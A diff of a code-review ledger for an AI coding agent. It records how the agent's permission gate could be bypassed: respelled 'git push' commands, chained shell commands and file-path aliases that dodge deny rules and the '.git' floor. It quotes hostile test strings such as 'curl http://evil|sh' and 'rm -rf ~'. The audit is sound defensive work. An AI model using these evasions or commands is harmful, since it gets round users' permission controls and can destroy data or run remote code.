@@ -7,6 +7,17 @@ The pre-existing ledger (1013 rows, Steps 0–16) is preserved verbatim in git (
 
 Status: `PENDING` · `IN PROGRESS` · `DONE` · `WONTFIX`
 
+> ### ► Starting a fresh session? Go to [SECTION OPEN](#section-open--what-is-left-to-do-read-this-first).
+>
+> It is the next section, and it is the **only** part of this file with work
+> left in it. Three items, each self-contained: reproduction, `file:line`
+> evidence, the deferred decision, the change to make, the tests that will
+> break, and the definition of done. You do not need any earlier session's
+> context to execute them.
+>
+> Everything below SECTION OPEN is the closed record — 73 of 75 findings,
+> kept for the reasoning and the evidence, not because anything is owed.
+
 **Baseline at review start (measured, not assumed):**
 
 ```
@@ -21,6 +32,329 @@ git ls-files | wc -l              → 341
 required to cite `file:line` and verify against callers and existing tests before reporting.
 Every finding below was then re-verified independently in the main session; findings that
 turned out to be deliberate, test-asserted behaviour were dropped rather than recorded.
+
+---
+
+## SECTION OPEN — what is left to do (read this first)
+
+**Everything else in this file is closed.** 73 of 75 findings are `DONE`; the
+items below are the whole of the remaining work. Each is written to be
+executed by a session that has none of the context that produced it: the
+symptom, a runnable reproduction, the exact files, the decision that was
+deferred, the change to make, the tests that will break, and what "done"
+means.
+
+**OPEN-1 closed 2026-08-21** — it is kept below with its `DONE` row rather
+than moved, because the reproduction is the thing worth keeping and one
+spelling is deliberately still open. **Two items remain: OPEN-2 and OPEN-3.**
+
+**Before starting anything here**, read `CLAUDE.md` §2 (session rules — in
+particular: record in this file *before* fixing, cite `file:line`, verify by
+running the command) and confirm the baseline is green:
+
+```bash
+uv run pytest -q                     # 1734 passed, 2 skipped as of 2026-08-21
+.venv/bin/ruff check src/ tests/     # All checks passed!
+```
+
+If that baseline does not reproduce, fix that first — a local `.venv` drifts
+from `uv.lock` and will lie to you (`CLAUDE.md` §9). `uv run` reconciles.
+
+Line numbers below were correct at 2026-08-21. **Re-grep for the named
+symbol rather than trusting the number** if the file has moved on.
+
+---
+
+### OPEN-1 · Deny rules for `execute` are evaded by ordinary respellings — **`DONE`**
+*(was CR-B3 — `WONTFIX` only because the fix changes matching behaviour)*
+
+**Severity:** Important. A user who copies the deny block Rudra's own
+template ships believes commands are blocked that are not.
+
+> **Closed 2026-08-21.** Five of the six spellings now deny; the sixth,
+> `git -C . push`, is left evading **on purpose** — see "What was measured"
+> at the end of this row. The reproduction below is kept as written so the
+> before/after is comparable.
+
+**Reproduce** (no model, no network — this runs today):
+
+```python
+import tempfile
+from pathlib import Path
+from rudra.permissions.rules import PermissionEngine
+
+root = Path(tempfile.mkdtemp())
+engine = PermissionEngine(
+    mode="auto", allow=(), deny=("execute:git push*",), floor_disable=(),
+    project_root=root, shell_in_auto=True,
+)
+for command in [
+    "git push origin main",            # deny   <- the only one that fires
+    "git  push origin main",           # ALLOW  <- two spaces
+    "git -C . push origin main",       # ALLOW  <- global flag before subcommand
+    "/usr/bin/git push origin main",   # ALLOW  <- absolute binary
+    "sh -c 'git push origin main'",    # ALLOW  <- wrapper shell
+    "GIT_DIR=.git git push origin main",  # ALLOW  <- leading env assignment
+]:
+    print(engine.decide("execute", {"command": command}).effect, command)
+```
+
+Measured 2026-08-21: **five of six evade.** (`true && git push origin main`
+is already denied — CR-B1 made deny rules pierce shell chaining.)
+
+**Evidence.** `src/rudra/permissions/rules.py:295` matches `execute` patterns
+with `fnmatch` against the command text, segment by segment
+(`_execute_matches`, `:236`; `command_segments`, `:231`). Nothing normalises
+whitespace, the binary's path, leading environment assignments, or a
+wrapper shell. `src/rudra/config/template.py:80` is the shipped example that
+this makes hollow:
+`deny = ["execute:git commit*", "execute:git push*", "execute:git reset --hard*"]`.
+
+**Why it was deferred.** Normalising changes what *every existing user rule*
+matches. That is a behaviour change to ship deliberately, not to fold into a
+bug-fix pass.
+
+**The decision, and the recommendation.** Canonicalise for **deny only**, not
+for allow. A canonical form that drops flags is dangerous on the permissive
+side — `git -C /other/repo status` would canonicalise to `git status`, so an
+`allow = ["execute:git status"]` would start permitting operations on a
+different repository. Applied to deny alone, canonicalisation can only *add*
+matches, so deny gets strictly stronger and no currently-blocked command
+becomes allowed. `rule_matches` already takes `permissive: bool`
+(`rules.py:262`), so the split costs nothing structurally.
+
+**What to change.** In `src/rudra/permissions/rules.py`, add a
+`canonical_command(segment) -> str` and match a deny pattern against **both**
+the raw segment and the canonical one:
+
+1. `shlex.split(segment)` — collapses runs of whitespace and honours quoting.
+   On `ValueError` (unbalanced quotes) fall back to the raw segment.
+2. Drop leading `NAME=value` assignments.
+3. `argv[0]` → `os.path.basename`, and strip a trailing `.exe` so Windows
+   spellings canonicalise the same way (`CLAUDE.md` §1 goal 8: branch on
+   shape, never on `sys.platform`).
+4. If that basename is a wrapper (`sh`, `bash`, `zsh`, `dash`, `env`) and a
+   `-c` argument follows, recurse into that argument — `sh -c '...'` is the
+   inner command wearing a costume.
+5. Re-join with single spaces.
+
+Leave global flags (`-C`, `--git-dir`) **in place**: dropping them is what
+makes the allow side unsafe, and keeping them still catches the four
+whitespace/path/env/wrapper cases. `git -C . push` is then caught by the raw
+segment gaining a canonical sibling, not by flag-stripping — verify this case
+explicitly and, if it still evades, say so in the row rather than
+flag-stripping to force it.
+
+**Tests.** Add to `tests/test_permissions_rules.py`, next to
+`test_a_deny_rule_fires_on_any_command_in_a_chain`. Assert each evasion above
+now denies, **and** assert the allow side is unchanged — that
+`allow = ["execute:git status"]` does *not* permit `git -C /other push`.
+No existing test should need changing; if one does, stop and read it first,
+because it may be pinning the behaviour on purpose (that is what happened
+with CR-B4).
+
+**Done when:** all six spellings deny, the allow-side test passes, full suite
+green, and `src/rudra/config/template.py:80`'s comment says what the deny
+block does and does not catch.
+
+**What was measured, 2026-08-21.** `canonical_command` added at
+`src/rudra/permissions/rules.py:258`; deny matching goes through
+`_denied_segment` (`:339`), which tries the raw segment and the canonical
+one. `_execute_matches`'s permissive branch is untouched.
+
+Same reproduction as above, re-run after the change:
+
+```
+deny   deny          git push origin main
+deny   deny          git  push origin main
+allow  mode-default  git -C . push origin main      <- still evades, by design
+deny   deny          /usr/bin/git push origin main
+deny   deny          sh -c 'git push origin main'
+deny   deny          GIT_DIR=.git git push origin main
+deny   deny          true && git push origin main
+```
+
+**One spelling is still open, and it is the recommendation's own cost.**
+`git -C .` puts a global flag between the binary and the subcommand, so only
+flag-stripping would close it — and flag-stripping is exactly what this row
+argued makes the function unsafe to reach for from the allow side
+(`git -C /other/repo status` → `git status`). Per this row's own instruction
+("say so rather than flag-stripping to force it"), it is recorded rather
+than forced, and pinned by
+`tests/test_permissions_rules.py::test_a_global_flag_before_the_subcommand_still_evades_deny`,
+whose docstring says to delete the test rather than work around it if a
+later change closes the case. `config/template.py` now documents the
+workaround, verified: `deny = ["execute:git push*", "execute:git -* push*",
+"execute:git --* push*"]` denies both `git -C . push` and
+`git --git-dir=.git push` while still allowing `git -C /other/repo status`.
+
+Two things went beyond the plan, both because a test caught them:
+
+- **Windows binary paths needed a shape check before `shlex`.** `shlex`
+  reads `\` as an escape — correct for `/bin/sh`, which is what the backend
+  runs (`rules.py:219`) — so `C:\tools\git.exe push` collapsed to
+  `C:toolsgit.exe push` and `basename` found nothing to strip.
+  `_WINDOWS_PATH` (`rules.py:251`) recognises a drive-letter or UNC prefix
+  and swaps separators first. That is a check on the **shape of the input**,
+  not on `sys.platform` (`CLAUDE.md` §1 goal 8), so it is exercised on macOS.
+- **The allow-side test was written in `auto` mode and measured nothing** —
+  the mode default allows every command there, so it passed before the fix
+  and after. Rewritten in `ask` mode, where a non-matching command comes back
+  `ask` and the assertion has teeth. Recorded because it is the failure mode
+  the test existed to prevent.
+
+Five tests added (`tests/test_permissions_rules.py`), no existing test
+changed. Verification:
+
+```
+uv run pytest -q                        → 1739 passed, 2 skipped in 28.78s  (exit 0)
+.venv/bin/ruff check src/ tests/        → All checks passed!
+.venv/bin/ruff format --check src/ tests/ → 260 files already formatted
+```
+
+(1734 → 1739 is the five new tests. One run in this session also printed a
+`libc++abi ... recursive_mutex lock failed` line at interpreter teardown; it
+did not reproduce, the exit code was 0, and it is unrelated to this change —
+noted only so a future session that sees it does not chase it here.)
+
+---
+
+### OPEN-2 · The plan approval prompt blocks the event loop
+*(the remaining half of CR-C6; the other half was fixed by CR-C5)*
+
+**Severity:** Minor — the safety property holds, but by accident rather than
+by design, and the prompt is unresponsive while it does.
+
+**Symptom.** At the `Proceed? [a]pprove [r]evise [c]ancel` prompt, Ctrl-C
+prints nothing and the prompt keeps waiting. "Stopping after this task —
+press Ctrl-C again to force" appears only *after* the user answers. The
+second press — the force-exit whose whole purpose is that a hung cancel must
+not need a kill from another terminal — is deferred just as long.
+
+**Evidence.** `ask_approval` (`src/rudra/loop/plan_view.py:81`) blocks in
+`Prompt.ask` (`:95`, and `:113` for the revision prompt), called
+synchronously from `RudraAgent._settle_plan`
+(`src/rudra/agent/main_agent.py:316`, `answer = self._approve(self.console)`)
+— which **is already `async`** (`:300`). Meanwhile `_cancel_on_sigint`
+(`src/rudra/cli.py:300`) installs the handler with
+`loop.add_signal_handler`, whose callback only runs when the loop regains
+control. So `except (EOFError, KeyboardInterrupt)` at `plan_view.py:100` and
+`:114` is unreachable under the shipping CLI: SIGINT no longer raises
+`KeyboardInterrupt` there. Its docstring calls that asymmetry "the one safety
+property this function has."
+
+The property survives only because the deferred `task.cancel()` lands at the
+first `await` inside `work()` — accidental, not designed.
+
+**What to change.** `_settle_plan` is already a coroutine, so this is one
+line at `main_agent.py:316`:
+
+```python
+answer = await asyncio.to_thread(self._approve, self.console)
+```
+
+`asyncio` is already imported there. Both `_approve` implementations stay
+synchronous — `ask_approval` and `auto_approve`
+(`plan_view.py:81`, `:71`) — which is what keeps them testable without a
+terminal.
+
+**Watch for:** `tests/test_agent_wiring.py:445` monkeypatches
+`main_agent.ask_approval`; a thread hop must not break that. Keep
+`plan_view.py`'s `except (EOFError, KeyboardInterrupt)` — EOF still raises
+there (a closed pipe), and it becomes reachable again for Ctrl-C on Windows,
+where `add_signal_handler` raises `NotImplementedError` and the default
+handler stays (`cli.py:337`).
+
+**Done when:** Ctrl-C at the approval prompt prints the stopping message
+*while the prompt is open*, a second press force-exits, EOF still cancels,
+and the full suite is green. Verify the interactive part by hand with a pty
+(`rudra --plan` is not enough — that path returns CANCEL before the prompt);
+state in the row how it was verified.
+
+---
+
+### OPEN-3 · Fence stripping corrupts a Markdown file that legitimately opens with a fence
+*(the remaining half of CR-E11; the crash half is fixed)*
+
+**Severity:** Minor, but it silently corrupts a file the agent writes, and
+this path is **always on** (D4 — not behind `[compat]`).
+
+**Reproduce:**
+
+```python
+from rudra.middleware.fix_write_params import _strip_fences
+readme = "```bash\nnpm i\n```\n\nSome text\n\n```js\nconst a = 1;\n```"
+print(repr(_strip_fences(readme)))
+# -> 'npm i\n```\n\nSome text\n\n```js\nconst a = 1;\n'
+#    the first opening fence and the last closing fence are deleted
+```
+
+**Evidence.** `_FENCE_RE` (`src/rudra/middleware/fix_write_params.py:22`) is
+`^```[^\n]*\n?(.*?)```\s*$` with `re.DOTALL`; `_strip_fences` (`:34`) applies
+it to any string `content`. A README whose *content* begins and ends with
+code fences matches the outer pattern.
+
+**Why it was deferred.** `tests/test_fix_write_params.py:38`
+(`test_keeps_inner_fences_when_stripping_outer`) asserts the greedy behaviour
+**deliberately**, for the case where a model wraps a whole markdown file in
+a ```markdown fence. The two shapes look alike; separating them needed a rule
+rather than a tweak.
+
+**The rule, already proven.** Strip the outer fence only when the interior
+contains no fence of its own, **or** when the info string names a markup
+type — that is exactly what distinguishes a wrapper from real content:
+
+| input | info string | interior has a fence | strip? |
+|---|---|---|---|
+| ` ```markdown …fences… ``` ` | `markdown` | yes | **yes** — it is a wrapper |
+| ` ```bash npm i ``` …text… ` | `bash` | yes | **no** — it is content |
+| ` ```python x = 1 ``` ` | `python` | no | **yes** |
+
+Prototyped 2026-08-21 against all five existing tests plus the corruption
+case: **all six pass.** Sketch:
+
+```python
+_FENCE_RE = re.compile(r"^```([^\n]*)\n?(.*?)```\s*$", re.DOTALL)
+_MARKUP_INFO = {"markdown", "md", "mdx", "rst", "text", "txt", ""}
+
+def _strip_fences(content: str) -> str:
+    match = _FENCE_RE.match(content.strip())
+    if match is None:
+        return content
+    info, inner = match.group(1).strip().lower(), match.group(2)
+    first = info.split()[0] if info else ""
+    if "```" in inner and first not in _MARKUP_INFO:
+        return content          # real fenced content, not a wrapper
+    return inner
+```
+
+Note the capture group moved from one group to two — check every use of
+`_FENCE_RE` before changing it (`grep -n _FENCE_RE src/ tests/`).
+
+**Tests.** Keep `test_keeps_inner_fences_when_stripping_outer` **unchanged**
+— it must still pass, that is the point. Add one for the README case, with a
+docstring saying why the two differ.
+
+**Done when:** the README round-trips byte-identical, all five existing fence
+tests still pass, and the full suite is green.
+
+---
+
+### Closed, but worth knowing before you touch these areas
+
+- **CR-X3 — no CI, by owner decision (2026-08-21).** Do not add a CI matrix
+  or propose a PR workflow: `CONTRIBUTING.md` accepts no pull requests, so a
+  `pull_request` gate guards nothing. Portability is held **structurally** —
+  branch on capability or input shape, never `sys.platform` — which is what
+  makes the Windows branch of `shell/runner.py` testable from macOS.
+- **CR-B4 changed what `outside-root` means.** Paths are virtual: the model's
+  `/etc/passwd` is `<project>/etc/passwd`. The floor now fires only on a real
+  escape (`../..`, or a symlink out). If a test of yours expects `/etc/hosts`
+  to be denied, it is asserting the old contract.
+- **The gate is the OUTERMOST middleware**, so it decides on the model's raw
+  spelling, before `FixWriteParamsMiddleware` renames anything. That is why
+  `gated_arg` reads every alias (CR-B2). Anything new that repairs arguments
+  must not assume the gate saw the repaired form.
 
 ---
 
@@ -52,6 +386,39 @@ narrow, or a robustness asymmetry rather than a live failure.
 | CR-F5 | Minor | **`DONE`** | **`CLAUDE.md` contradicts itself on the test count.** `:399` "955 passed, 2 skipped at Step 10a; must never go down" vs `:472` "the suite is at **1696 passed / 2 skipped**". Measured: 1696 passed, 2 skipped. The `:399` figure is the one in the Commands block a reader would actually check against. <br><br>**FIXED 2026-08-21.** Fixed: both counts now read 1713 passed / 2 skipped, measured. |
 | CR-F6 | Minor | **`DONE`** | **`CLAUDE.md` §3's architecture tree omits two shipped packages.** `src/rudra/mcp/` (5 modules, Step 13) and `src/rudra/skills/` (9 modules, Step 11) have no entry, while every other package does. §3 is the map a fresh session navigates by. <br><br>**FIXED 2026-08-21.** Fixed: `mcp/` and `skills/` added to the §3 architecture tree. |
 
+### CR-DOC — CLAUDE.md accuracy, 2026-08-21
+
+`CLAUDE.md` is loaded into **every** session, so a wrong line there misleads
+every future reader before they look at any code. Audited against reality
+after `CONTRIBUTING.md` was re-read; its stated principle — *"One fact, one
+owner — a second copy would drift"* — is what most of these violate.
+
+| # | Severity | Status | Finding |
+|---|---|---|---|
+| CR-DOC1 | **Important** | **`DONE`** | **Every session is sent to `TODO.md` sections that no longer exist there.** §2.1 says "§0 = locked decisions, §E = execution order (which step to do next), §F = deepagents 0.7.4 upgrade findings", and §4/§6/§7 cross-reference `TODO.md` §0, §0.1, §F, U.7, A1.46, S6.1. Measured: `grep -cE '^## SECTION (0\|E\|F)' TODO.md` → **0**; the same grep against `TODO-old.md` → **3**. `TODO.md` was replaced by the code-review ledger, so a fresh session told to read §E for "which step to do next" finds nothing and has no way to know the content moved. <br><br>**FIXED 2026-08-21.** Fixed: a note at the top of `CLAUDE.md` states which ledger owns what — `TODO.md` for the current CR findings, `TODO-old.md` for §0/§0.1/§E/§F and every `A*`/`C*`/`S*`/`U*` item — and session rule 1 now sends readers to the right file for each. |
+| CR-DOC2 | **Important** | **`DONE`** | **§6 says `[skills]` and `[memory]` are reserved and writing one is a hard error.** Measured: `RESERVED_SECTIONS` is now `{}` and `_TOP_LEVEL` accepts `agent, compat, mcp, memory, model, permissions, skills, tools`. Both sections have shipped. The "Live as of Step 7" list in the same paragraph is also short by three — it omits `[skills]`, `[mcp]` and `[memory]`. <br><br>**FIXED 2026-08-21.** Fixed: §6 now reads "Every section is live" and lists all eight, noting `RESERVED_SECTIONS` is `{}`, with the distinction that MCP *servers* stay in `.mcp.json` while `[mcp]` config decides which are used. |
+| CR-DOC3 | Minor | **`DONE`** | **§6 says "`[tools]` carries `shell` and nothing else"**, and the TOML block **twelve lines below it** shows four keys. Measured: `fields(ToolsConfig)` → `shell, shell_in_auto, auto_branch, test_timeout`. The file contradicts itself on the same screen. <br><br>**FIXED 2026-08-21.** Fixed: §6 now lists all four `[tools]` keys, matching the TOML block below it. |
+| CR-DOC4 | **Important** | **`DONE`** | **§4's table says `skills=` is "❌ never used — Step 11".** Measured: passed at `subagents/build.py:282` (`skills=_skills_for(spec, context)`) and `agent/planner_agent.py:463`. Step 11 shipped; the table still describes the pre-Step-11 state. <br><br>**FIXED 2026-08-21.** Fixed: the `skills=` row now reads ✅ with the two call sites (`subagents/build.py:282`, `agent/planner_agent.py:463`). |
+| CR-DOC5 | **Important** | **`DONE`** | **§4's table says "Nothing passes `subagents=` to a live agent yet — 9c owns the parent that delegates".** Measured: `agent/main_agent.py:687` passes `subagents=subagent_context`. Step 9c shipped. <br><br>**FIXED 2026-08-21.** Fixed: the `subagents=` row now cites `agent/main_agent.py:687`. |
+| CR-DOC6 | Minor | **`DONE`** | **§2.5 tells sessions to write plans under `plans/`, which does not exist.** `ls -d plans/` → missing, and nothing in the repo creates it. A session following the rule writes into a directory no convention covers. <br><br>**FIXED 2026-08-21.** Fixed: §2.5 now names `docs/superpowers/plans/`, which exists and holds the existing plans. |
+| CR-DOC7 | Minor | **`DONE`** | **§3's heading says "Current Architecture (as of 2026-08-13, Step 10a)"** while the body describes work through Step 16. Anyone trusting the heading discounts everything under it as six steps stale. <br><br>**FIXED 2026-08-21.** Fixed: §3's heading now reads "through Step 16, plus the 2026-08-21 review". |
+| CR-DOC8 | Minor | **`DONE`** | **Two counts are stale again.** §8 and §9 say `1713 passed`; measured `1734 passed, 2 skipped`. §9 says "341 files tracked"; `git ls-files \| wc -l` → **342**. These drift on every change, which is itself the argument against restating them. <br><br>**FIXED 2026-08-21.** Fixed by **removing** the counts rather than updating them — the test total and the tracked-file count are no longer restated in `CLAUDE.md`, because both drifted twice in one day and `Documentation/07-development.md` owns the first. Restating a number that changes on every commit is the drift `CONTRIBUTING.md` warns about. |
+| CR-DOC9 | **Important** | **`DONE`** | **CLAUDE.md restates the development workflow that `CONTRIBUTING.md` assigns to a single owner.** CONTRIBUTING says setup, tests, the pre-push gate, layout and house rules live in `Documentation/07-development.md` and "It is not repeated here on purpose. One fact, one owner — a second copy would drift, which this project has a ledger full of examples of." §8 of CLAUDE.md is a second copy, and CR-DOC8 is that drift, already happened, twice. CLAUDE.md also never mentions `CONTRIBUTING.md`'s actual rule for a contributor-facing session — **pull requests are not accepted** — so a session could propose a PR workflow the project refuses. <br><br>**FIXED 2026-08-21.** Fixed: §8 now opens by naming `Documentation/07-development.md` as the owner of the development workflow, quotes CONTRIBUTING's "one fact, one owner" reasoning, and says that file wins on any disagreement. It also states the contribution rule a session needs — **pull requests are not accepted**, issues welcome, security privately via `SECURITY.md` — and instructs against proposing a PR workflow or CI to gate one. |
+| CR-DOC10 | Minor | **`DONE`** | **§1 goal 8 and `TODO.md` CR-X3 both point at CI as the way to verify portability.** The owner has since decided **CI is not wanted** (2026-08-21), which is consistent with `CONTRIBUTING.md` — no PRs are accepted, so there is nothing for a PR-triggered gate to guard. Both places need to say what verification actually looks like instead, rather than naming a thing that is not coming. <br><br>**FIXED 2026-08-21.** Fixed in both files: `CLAUDE.md` §1 goal 8 no longer points at CI, and instead states the rule that actually keeps portability — branch on capability or input shape, never `sys.platform`, because a capability branch is exercisable from the other platform — plus the honest limit. `TODO.md` CR-X3 is now `WONTFIX` with the owner's decision and its reasoning. |
+
+### CR-X — cross-platform (owner requirement, 2026-08-21)
+
+**Owner decision, stated 2026-08-21: Rudra must work on Windows, macOS and
+Linux. OS portability is a first-class requirement, not a nice-to-have.**
+This is new — nothing in `TODO.md` or `CLAUDE.md` previously said so, and the
+suite has only ever run on macOS.
+
+| # | Severity | Status | Finding |
+|---|---|---|---|
+| CR-X1 | **CRITICAL (Windows)** | **`DONE`** | **A command timeout crashed the run on Windows instead of killing the command.** `shell/runner.py` reaped a timed-out child with `os.killpg(os.getpgid(process.pid), signal.SIGKILL)`, caught only by `except (ProcessLookupError, PermissionError)`. **`os.killpg` and `os.getpgid` do not exist on Windows** — they are POSIX-only — so the call raises `AttributeError`, which that clause does not catch, and it propagated out of `run_gated`. Inside `run_pipeline` the blanket `except Exception` turns it into an *internal Rudra error* with `escalate=True` and stops the whole run; outside it (`changed_files_from_git`, `git_snapshot`) it is an uncaught traceback. So on Windows the mechanism that exists to bound a hung test suite was itself what ended the run. Compounding it: `start_new_session=True` is **silently ignored** on Windows — verified in CPython's own source, where the Windows `_execute_child` names the parameter `unused_start_new_session` — so there was no process group to kill even if the call had worked, and a test runner's workers survived. <br><br>**FIXED 2026-08-21.** `_process_group_kwargs()` picks the spelling by **capability** — `creationflags=CREATE_NEW_PROCESS_GROUP` where that constant exists (Windows only), `start_new_session=True` otherwise — and `_kill_tree()` kills the group on POSIX, falls back to `taskkill /F /T /PID` where `os.killpg` is absent, and calls `process.kill()` unconditionally if the process is still alive. Verified two ways: on POSIX a real 2s timeout against a process that spawns a child still reports `timed_out=True` and reaps the tree; and with `os.killpg`/`os.getpgid` deleted and `CREATE_NEW_PROCESS_GROUP` present — a Windows-shaped platform — the kwargs become `{'creationflags': 512}`, `taskkill /F /T /PID` is invoked, and the child terminates, with no `AttributeError`. Regressions: `tests/test_shell_runner.py::test_the_process_group_kwarg_matches_the_platform` and `::test_a_timeout_kills_the_child_even_without_posix_apis`. |
+| CR-X2 | **Important (Windows)** | **`DONE`** | **Every vendored skill failed its integrity check on a Windows clone.** `skills/manifest.py:21-26` hashes each file's **raw bytes**, and there was **no `.gitattributes` in the repo**. Git's default on Windows is `core.autocrlf=true`, which rewrites LF to CRLF on checkout — so all **55** files under `src/rudra/skills/bundles/` hash differently than the manifest records. Measured: the same content as LF and as CRLF gives `0fc546b8ed5e7645…` vs `8647ac91c15754f7…`. Consequences on Windows: `verify_manifest` reports `content changed:` for all 55, and `cache_key` (`skills/cache.py`) changes, so the rendered corpus is rebuilt under a different key. S11a.3's whole model — "different bytes, different manifest, different key" — read a checkout artefact as tampering. <br><br>**FIXED 2026-08-21.** Added `.gitattributes` with `* text=auto eol=lf` plus an explicit `src/rudra/skills/bundles/** text eol=lf`, so the corpus the manifest hashes checks out as LF on every platform whatever the user's `core.autocrlf` is. `*.sh` and `.githooks/*` are pinned to LF too — a CRLF shebang makes the interpreter unfindable (`/bin/sh\r: no such file or directory`) — and `*.bat`/`*.cmd` to CRLF, which is what cmd.exe wants. Verified: `git check-attr text eol` on a bundle file reports `text: set, eol: lf`, and no file under `bundles/` currently holds a CRLF. Regressions: `tests/test_skills_manifest.py::test_the_vendored_corpus_is_pinned_to_lf_line_endings` and `::test_no_vendored_file_currently_holds_a_crlf_line_ending` — the protection and the bytes, since the symptom itself only appears on a platform the suite has never run on. |
+| CR-X3 | **Important** | **`WONTFIX`** | **Nothing verifies any of this: the suite has only ever run on one OS, and there is no CI.** `grep -rn "sys.platform\|os.name\|platform.system" src/rudra` returns **nothing** — the package has no platform branch anywhere, and the places that do handle Windows do it by shape or capability rather than by test (`stacks/detect.py:79` checks both `bin/` and `Scripts/`; `cli.py:337` catches `NotImplementedError` from `add_signal_handler`; `shell/runner.py` after CR-X1). `CLAUDE.md` §9 records that CI was deleted in S16.5 and `.githooks/pre-push` is the only gate, which runs on the developer's machine — macOS. **So every portability claim in this section is by inspection and simulation, not execution.** With Windows/macOS/Linux now a stated requirement, the suite needs to run on all three before any of it can be called verified. That means re-adding CI as an OS matrix (`windows-latest`, `macos-latest`, `ubuntu-latest`) on **push**, which is a reversal of S16.5 and therefore an owner decision — S16.5's reasoning was that CI fired only on `pull_request` and no PRs are accepted, which a push trigger does not share. <br><br>**2026-08-21 — WONTFIX, owner decision: CI is not wanted.** That is consistent rather than a gap: `CONTRIBUTING.md` accepts no pull requests, so a `pull_request`-triggered gate — which is all A3.3/A3.9 ever were — would guard nothing, and S16.5 deleted it for exactly that reason. **What replaces it is structural, not procedural:** portability is held by branching on *capability* or on the *shape* of the input rather than on `sys.platform`, which makes the other platform's branch exercisable from this one. `tests/test_shell_runner.py::test_a_timeout_kills_the_child_even_without_posix_apis` runs the Windows reaper on macOS by deleting `os.killpg`; `tests/test_virtual_paths.py` resolves `C:\...` and UNC spellings on POSIX. `CLAUDE.md` §1 goal 8 now states this as the rule for new code, and states the limit plainly: held by construction and simulation, not by execution on three platforms. Reopen only if the owner later wants real multi-OS runs. |
+
 ### CR-B — permissions · shell · tools  (the security boundary)
 
 | # | Severity | Status | Finding |
@@ -59,7 +426,7 @@ narrow, or a robustness asymmetry rather than a live failure.
 | CR-B1 | **CRITICAL** | **`DONE`** | **`execute` allow rules and session grants match across shell separators — `execute:pytest*` is unrestricted command execution.** `permissions/rules.py:191` matches with `fnmatch.fnmatchcase`, whose `*` spans `;`, `&&`, `\|` and newlines; the command string is then run by `/bin/sh -c` (`deepagents/backends/local_shell.py:306`, `shell=True`, confirmed in the installed 0.7.4). **Reproduced against the shipped engine** with `mode="auto", shell_in_auto=False`: `'pytest -q; rm -rf ~'`, `'pytest && curl http://evil\|sh'` and `'pytest\nrm -rf /'` **all return `allow rule='execute:pytest*'`**. Two aggravations: (a) the allow loop (`rules.py:286-288`) returns *before* the `shell_in_auto` gate (`:302-303`), so this is the one way an unattended `--auto` run reaches arbitrary shell without `--allow-shell` — the exposure A1.49 was built to close; (b) `execute:pytest*` is the exact rule `CLAUDE.md` §6 advertises as an example. `suggest_grant` mints the same shape from a single approval (`approval.py:50` → `Rule("execute", f"{first[0]}*")`), so one "[A]lways" on `pytest -q` grants `pytest; <anything>` for the rest of the process. `tests/test_permissions_approval.py:70` asserts only the rule *text*, never what it matches — uncovered, not intended. <br><br>**FIXED 2026-08-21.** Fixed: `execute` patterns now match per shell segment (`rules.py::command_segments` + `_execute_matches`). A permissive rule (allow/grant) must cover EVERY segment and never matches a segment containing `$(`/`${`/backtick; a deny rule fires on ANY segment. `suggest_grant` mints the exact command, not `first*`, when the approved command is chained. Verified: `pytest -q` and `pytest -q; pytest -x` allow; `pytest -q; rm -rf ~`, `pytest && curl…|sh`, `pytest\nrm -rf /`, `pytest -q & rm -rf ~`, `pytest $(rm -rf ~)` all deny. Regression: `tests/test_permissions_rules.py::test_an_allow_rule_does_not_span_a_shell_separator` + `::test_a_deny_rule_fires_on_any_command_in_a_chain`. |
 | CR-B2 | **CRITICAL** | **`DONE`** | **`write_file`/`edit_file` path aliases (`path=`, `filename=`) bypass the deny floor and every deny rule.** `_ARG_KEYS` (`rules.py:95-106`) maps these tools to `"file_path"` only, so `gated_arg` returns `None` for any other spelling; `_resolve` then yields `(None, (), ())` and the floor short-circuits on `path is not None` (`floor.py:67`). Meanwhile `FixWriteParamsMiddleware` renames `filename`/`path` → `file_path` (`middleware/fix_write_params.py:77-80`) — **always on, never gated** — and it runs *inside* the gate, because the gate is installed outermost (`subagents/build.py:219` and `agent/planner_agent.py:386`, both `middleware.insert(0, …)`). The gate therefore decides on un-repaired args and the repair happens afterwards, before the tool runs. **Reproduced:** with `deny=("write_file:.env",)`, `{"file_path": ".env"}` → `deny`, but `{"path": ".env"}` and `{"filename": ".env"}` → **`allow` `src=mode-default`**; and `{"file_path": ".git/config"}` → `deny <floor:git-dir>` while `{"path": ".git/config"}` → **`allow`**. So `write_file(path=".git/config", …)` defeats the `git-dir` floor and can plant git config or hooks in the user's repo. In `ask` mode it is worse than silent: the decision is "ask", the prompt fires, but `diff.py:63` reads `args.get("file_path","")`, so the approval panel shows the write **with no path at all** — the user approves a write whose destination is not displayed. (Backend `virtual_mode=True` still confines it to the project root, so this is policy bypass inside the project, not host escape.) <br><br>**FIXED 2026-08-21.** Fixed: `gated_arg` now reads every spelling `FixWriteParamsMiddleware` accepts (`_ARG_ALIASES`), and `decide` fails **closed** — a mutating tool whose path argument is missing or non-string returns `deny <unresolvable-path>` instead of falling through to the mode default. Verified: `.env` and `.git/config` now deny under `file_path`, `path` and `filename` alike; `{}` and `{'file_path': 123}` deny as `fail-closed`; `ls(path=…)` unaffected. Regression: `tests/test_permissions_rules.py::test_a_path_alias_cannot_dodge_the_floor_or_a_deny_rule`. |
 | CR-B3 | **Important** | **`WONTFIX`** | **The shipped deny examples are trivially evaded — `execute:git push*` matches only one exact spelling.** `config/template.py:80` ships `deny = ["execute:git commit*", "execute:git push*", "execute:git reset --hard*"]`, matched raw with no normalisation of whitespace, argv position, or binary path. **Measured:** `'git push origin main'` → deny, but `'git  push origin main'` (two spaces), `'git -C . push origin main'`, `'/usr/bin/git push origin main'`, `"sh -c 'git push origin main'"` and `'true && git push origin main'` **all allow**. A user who copies the template's own deny block believes pushes are blocked; five of six semantically identical commands go through. Note the asymmetry with CR-B1 — for *allow*, `*` is too greedy; for *deny*, the literal prefix is too strict — and both live in the same `fnmatch` call. <br><br>**2026-08-21.** **WONTFIX for now — superseded in part, and the rest needs a design decision.** CR-B1's fix makes deny rules pierce shell chaining, so `true && git push` is now denied. The remaining evasions (`git  push` with two spaces, `git -C . push`, `/usr/bin/git push`) need argv normalisation — `shlex.split`, basename, skip leading options — which changes what every existing user rule matches. That is a behaviour change to ship deliberately, not fold into a bug-fix pass. The template's deny block should carry a caveat until then. |
